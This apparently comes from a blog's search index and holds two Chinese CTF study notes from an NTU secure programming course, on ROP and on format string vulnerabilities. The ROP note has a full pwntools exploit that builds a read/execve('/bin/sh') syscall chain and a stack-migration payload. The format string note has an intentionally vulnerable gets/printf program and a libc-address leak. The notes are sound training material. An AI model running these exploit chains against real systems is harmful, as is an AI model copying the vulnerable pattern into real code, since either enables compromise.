<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NTU STCS 2016学习笔记 0x02 ROP</title>
    <url>/2020/08/25/ntu-stcs-2016-w4/</url>
    <content><![CDATA[<p><strong>week4 shellcode rop</strong></p>
<a id="more"></a>

<h1 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in bash commandline</span></span><br><span class="line">gdbserver 127.0.0.1:4000 ./binary <span class="comment">#break在entrypoint</span></span><br><span class="line"><span class="comment"># in gdb commandline</span></span><br><span class="line">gdb ./binary</span><br><span class="line">$ target remote 127.0.0.1:4000</span><br><span class="line">$ <span class="built_in">continue</span></span><br><span class="line"><span class="comment"># 搭配ncat</span></span><br><span class="line">ncat -vc <span class="string">&#x27;gdbserver 127.0.0.1:4000 .binary&#x27;</span> -kl 127.0.0.1 5000</span><br></pre></td></tr></table></figure>

<p><strong>trick</strong></p>
<p>使用gdbscript attach pid</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gdbinit</span></span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line">define at</span><br><span class="line">  shell <span class="built_in">echo</span> attach $(pidof -s <span class="variable">$arg0</span>) &gt; /tmp/foo.gdb</span><br><span class="line">  <span class="built_in">source</span> /tmp/foo.gdb</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h1><p>类型包括:ret2syscall ret2text ret2libc</p>
<h2 id="rop2syscall"><a href="#rop2syscall" class="headerlink" title="rop2syscall"></a>rop2syscall</h2><ul>
<li>找gadget控制syscall需要的regs(eax,ebx,ecx,edx)</li>
<li>需要int 80</li>
</ul>
<p><strong>RopGadget</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#usage</span></span><br><span class="line">RopGadget --binary ./binary</span><br><span class="line"><span class="comment">#int 80 ; ret</span></span><br><span class="line">RopGadget --binary ./binary --opcode cd80c3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>PS:execve需要’/bin/sh’，且地址必须已知<br>用read吧需要的字符串输入至已知地址的buffer上</p>
</blockquote>
<p>找可写page用于read(0,buf_addr,len)中的buf_addr<br>一般用bss最后一页即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /proc/`pidof binary`/maps</span><br><span class="line">readelf -a binary | less <span class="comment"># 看Section Headers中的.bss</span></span><br></pre></td></tr></table></figure>

<p>eg.</p>
<div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Opcode Table
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./p1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./p1&#x27;</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">pop_eax_ret = g(<span class="string">&#x27;pop eax ; ret&#x27;</span>) <span class="comment"># 0x080b8126</span></span><br><span class="line">pop_ebx_ret = g(<span class="string">&#x27;pop ebx ; ret&#x27;</span>) <span class="comment"># 0x080481c9</span></span><br><span class="line">pop_ecx_ret = g(<span class="string">&#x27;pop ecx ; ret&#x27;</span>) <span class="comment"># 0x080de849</span></span><br><span class="line">pop_edx_ret = g(<span class="string">&#x27;pop edx ; ret&#x27;</span>) <span class="comment"># 0x0806edca</span></span><br><span class="line">int_0x80_ret = g(<span class="string">&#x27;int 0x80 ; ret&#x27;</span>)</span><br><span class="line">buf = <span class="number">0x080eb000</span> - <span class="number">100</span></span><br><span class="line">raw_input(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">offset = <span class="number">62</span></span><br><span class="line"><span class="comment"># read(0, &#x27;/bin/sh\x00&#x27;, 100)</span></span><br><span class="line">rop1 = [</span><br><span class="line">  pop_eax_ret,</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  pop_ebx_ret,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  pop_ecx_ret,</span><br><span class="line">  buf,</span><br><span class="line">  pop_edx_ret,</span><br><span class="line">  <span class="number">100</span>,</span><br><span class="line">  int_0x80_ret,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line">rop2 = [</span><br><span class="line">  pop_eax_ret,</span><br><span class="line">  <span class="number">0xb</span>,</span><br><span class="line">  pop_ebx_ret,</span><br><span class="line">  buf,</span><br><span class="line">  pop_ecx_ret,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  pop_edx_ret,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(map(p32, rop1)) + <span class="string">&#x27;&#x27;</span>.join(map(p32, rop2))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

    </div>
</div>

<h3 id="使用较长的gadget"><a href="#使用较长的gadget" class="headerlink" title="使用较长的gadget"></a>使用较长的gadget</h3><p><img src="w4-long-gadget.png" alt="long gadget"></p>
<p><strong>leave指令</strong></p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">leave</span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">pop</span>   <span class="built_in">ebp</span></span><br></pre></td></tr></table></figure>

<p><strong>Trick: Stack Migration</strong></p>
<ul>
<li>使用leave把栈放到已知位置</li>
<li>确定rop chain的位置时可以直接附加其他data</li>
<li>可以无限rop</li>
<li>migrate后的空间要足够</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gadget1 = <span class="number">0x8048898</span></span><br><span class="line"><span class="comment"># gadget1 has gets() and leave_ret</span></span><br><span class="line"><span class="comment"># 8048898:       50                      push   eax</span></span><br><span class="line"><span class="comment"># 8048899:       e8 e2 69 00 00          call   804f280 &lt;_IO_gets&gt;</span></span><br><span class="line"><span class="comment"># 804889e:       83 c4 10                add    esp,0x10</span></span><br><span class="line"><span class="comment"># 80488a1:       90                      nop</span></span><br><span class="line"><span class="comment"># 80488a2:       c9                      leave</span></span><br><span class="line"><span class="comment"># 80488a3:       c3                      ret</span></span><br><span class="line">migration = [</span><br><span class="line">    pop_ebp_ret,</span><br><span class="line">    buf - <span class="number">4</span>,  <span class="comment">#leave会pop ebp，所以要控制到buf-4位置</span></span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    buf,</span><br><span class="line">    gadget1,</span><br><span class="line">]</span><br><span class="line">rop = [</span><br><span class="line">    pop_eax_ret,</span><br><span class="line">    <span class="number">0xb</span>,</span><br><span class="line">    pop_ebx_ret,</span><br><span class="line">    buf + <span class="number">9</span> * <span class="number">4</span>,  <span class="comment">#ropchain一共有9*4bytes</span></span><br><span class="line">    pop_ecx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_edx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    int_0x80_ret</span><br><span class="line">]</span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * offset + <span class="string">&#x27;&#x27;</span>.join(map(p32, migration))</span><br><span class="line">payload2 = <span class="string">&#x27;&#x27;</span>.join(map(p32, rop)) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>NTU STCS 2016学习笔记 0x04 Format String</title>
    <url>/2020/08/30/ntu-stcs-2016-w6/</url>
    <content><![CDATA[<p><strong>format string vulnerable exploit</strong></p>
<a id="more"></a>

<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><ul>
<li><em>在输出火字符串处理函数中用来表示输出的字符串格式</em></li>
<li><em>在以下的”%s %d”即为format string</em></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d\n&quot;</span>, str, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s %d\n&quot;</span>, str, a);</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%s %d\n&quot;</span>, str, a);</span><br></pre></td></tr></table></figure>

<h2 id="Format-String-Vulnerablility"><a href="#Format-String-Vulnerablility" class="headerlink" title="Format String Vulnerablility"></a>Format String Vulnerablility</h2><ul>
<li><em>错误的使用方式，直接将使用者的输入作为fmt使用</em></li>
<li><em>将printf(“%s”, str)，写成gets(str);printf(str);</em></li>
<li><em>此类错误不易发现，因为如果没有测试特殊input执行结果不变</em></li>
</ul>
<h2 id="fmt使用方式"><a href="#fmt使用方式" class="headerlink" title="fmt使用方式"></a>fmt使用方式</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$*1$d&quot;</span>, width, num);</span><br></pre></td></tr></table></figure>

<ul>
<li><em>%2$制定要以%d输出的是第几个参数</em></li>
<li><em>1$制定要作为输出的长度是第几个参数</em></li>
<li><em>width = 10,num = 5时相当于printf(“%10d”, 5)</em></li>
</ul>
<p><img src="w6-fmt-stacktrace.png" alt="w6-fmt-stacktrace"></p>
<p><strong>例子:</strong><a href="fmt1">fmt1</a></p>
<p>source code</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">while</span>(gets(str)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fmt漏洞成因"><a href="#fmt漏洞成因" class="headerlink" title="fmt漏洞成因"></a>fmt漏洞成因</h2><ul>
<li><em>format string可以被攻击者的输入人以控制，而printf本身不会检查后面有几个参数</em></li>
<li><em>使用%x会造成stack上的info leak</em></li>
<li><em>使用$控制要leak的位置</em></li>
</ul>
<p><strong>PS.：</strong> <em>x64的程序使用%lx</em></p>
<h2 id="leak-libc-base"><a href="#leak-libc-base" class="headerlink" title="leak libc base"></a>leak libc base</h2><ul>
<li><em>程序执行起点为_start，把main作为参数传入__libc_start_main</em></li>
<li><em>__libc_start_main会先完成初始化造作，之后call main函数</em></li>
<li><em>main的ret addr指向libc内部，且存放在stack上的值可以用%x泄露出来</em></li>
<li><em>leak出来的位数ec5和return会libc里的位置一致，但由于ASLR的关系使得高位随机</em></li>
<li><em>会return的位置会在call exit前面一些</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./fmt1</span><br><span class="line">%21<span class="variable">$lx</span></span><br><span class="line">7f0438b721e3</span><br></pre></td></tr></table></figure>

<h1 id="stackguard-CANARY"><a href="#stackguard-CANARY" class="headerlink" title="stackguard(CANARY)"></a>stackguard(CANARY)</h1><ul>
<li>编译器对stack overflow的一种保护机制</li>
<li>在call函数时在stack上放的值</li>
<li>函数return时先检查CANARY是否被修改</li>
</ul>
<p><img src="w6-fmt-stackguard.png" alt="w6-fmt-stackguard"></p>
<p><img src="w6-fmt-canary.png" alt="w6-fmt-canary"></p>
<h2 id="Leak-StackGuard-Canary"><a href="#Leak-StackGuard-Canary" class="headerlink" title="Leak StackGuard Canary"></a>Leak StackGuard Canary</h2><p><img src="w6-fmt-leakcanary.png" alt="w6-fmt-leakcanary"></p>
<h2 id="利用leak-canary攻击"><a href="#利用leak-canary攻击" class="headerlink" title="利用leak canary攻击"></a>利用leak canary攻击</h2><p><img src="w6-fmt-attcanary.png" alt="w6-fmt-attcanary"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
